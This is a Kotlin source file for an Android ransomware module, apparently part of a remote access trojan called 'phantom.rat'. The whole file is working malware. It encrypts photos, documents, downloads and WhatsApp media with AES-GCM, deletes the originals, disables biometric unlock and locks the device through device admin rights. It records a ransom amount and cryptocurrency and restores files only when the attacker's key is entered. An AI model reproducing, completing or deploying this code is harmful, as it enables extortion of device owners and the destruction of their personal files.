package com.phantom.rat.modules

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.os.Build
import org.json.JSONObject
import java.io.File
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import javax.crypto.spec.GCMParameterSpec
import android.util.Base64

class RansomwareModule(private val context: Context) {

    private val prefs = context.getSharedPreferences("ransomware_prefs", Context.MODE_PRIVATE)
    private val secureRandom = SecureRandom()

    fun lockDevice(message: String, key: String, amount: Double, crypto: String): JSONObject {
        try {
            prefs.edit().apply {
                putString("ransom_key", key)
                putString("ransom_message", message)
                putString("ransom_status", "locked")
                putLong("ransom_time", System.currentTimeMillis())
                putString("ransom_crypto", crypto)
                putFloat("ransom_amount", amount.toFloat())
                apply()
            }

            Thread { encryptFiles(key) }.start()

            val dpm = context.getSystemService(Context.DEVICE_ADMIN_SERVICE) as DevicePolicyManager
            val component = ComponentName(context, com.phantom.rat.core.AdminReceiver::class.java)

            if (dpm.isAdminActive(component)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    dpm.setKeyguardDisabledFeatures(component,
                        DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT or
                        DevicePolicyManager.KEYGUARD_DISABLE_FACE)
                }
                dpm.lockNow()
            }

            return JSONObject().apply {
                put("status", "success")
                put("message", "Device locked")
                put("key", key)
                put("amount", amount)
                put("crypto", crypto)
            }
        } catch (e: Exception) {
            return JSONObject().apply {
                put("status", "error")
                put("message", e.message)
            }
        }
    }

    fun unlockDevice(inputKey: String): JSONObject {
        val storedKey = prefs.getString("ransom_key", "")
        if (inputKey == storedKey) {
            prefs.edit().putString("ransom_status", "unlocked").apply()
            Thread { decryptFiles(inputKey) }.start()

            val dpm = context.getSystemService(Context.DEVICE_ADMIN_SERVICE) as DevicePolicyManager
            val component = ComponentName(context, com.phantom.rat.core.AdminReceiver::class.java)
            if (dpm.isAdminActive(component)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    dpm.setKeyguardDisabledFeatures(component, 0)
                }
            }

            return JSONObject().apply {
                put("status", "success")
                put("message", "Device unlocked. Files being decrypted.")
            }
        }
        return JSONObject().apply {
            put("status", "error")
            put("message", "Invalid key!")
        }
    }

    fun getStatus(): JSONObject {
        return JSONObject().apply {
            put("status", prefs.getString("ransom_status", "none"))
            put("message", prefs.getString("ransom_message", ""))
            put("amount", prefs.getFloat("ransom_amount", 0.0))
            put("crypto", prefs.getString("ransom_crypto", "BTC"))
            put("time", prefs.getLong("ransom_time", 0))
        }
    }

    private fun encryptFiles(key: String) {
        val dirs = listOf(
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Documents",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/WhatsApp/Media"
        )
        dirs.forEach { dir ->
            val file = File(dir)
            if (file.exists()) {
                file.walkTopDown().filter { it.isFile }.forEach { f ->
                    try {
                        val ext = f.extension.lowercase()
                        if (ext in listOf("jpg","jpeg","png","gif","mp4","3gp","doc","docx","pdf","txt","xls","xlsx","zip")) {
                            encryptFile(f, key)
                        }
                    } catch (_: Exception) {}
                }
            }
        }
    }

    private fun decryptFiles(key: String) {
        val dirs = listOf(
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Documents",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/WhatsApp/Media"
        )
        dirs.forEach { dir ->
            val file = File(dir)
            if (file.exists()) {
                file.walkTopDown().filter { it.name.endsWith(".encrypted") }.forEach { f ->
                    try { decryptFile(f, key) } catch (_: Exception) {}
                }
            }
        }
    }

    private fun encryptFile(file: File, key: String) {
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val secretKey = SecretKeySpec(key.padToLength(32).toByteArray(), "AES")
        val iv = ByteArray(12).also { secureRandom.nextBytes(it) }
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, GCMParameterSpec(128, iv))
        val input = file.readBytes()
        val encrypted = cipher.doFinal(input)
        val combined = iv + encrypted
        File(file.absolutePath + ".encrypted").writeBytes(combined)
        file.delete()
    }

    private fun decryptFile(file: File, key: String) {
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val secretKey = SecretKeySpec(key.padToLength(32).toByteArray(), "AES")
        val data = file.readBytes()
        val iv = data.copyOfRange(0, 12)
        val encrypted = data.copyOfRange(12, data.size)
        cipher.init(Cipher.DECRYPT_MODE, secretKey, GCMParameterSpec(128, iv))
        val decrypted = cipher.doFinal(encrypted)
        val originalPath = file.absolutePath.replace(".encrypted", "")
        File(originalPath).writeBytes(decrypted)
        file.delete()
    }

    private fun String.padToLength(len: Int): String =
        if (this.length >= len) this.substring(0, len)
        else this.padEnd(len, 'X')
}
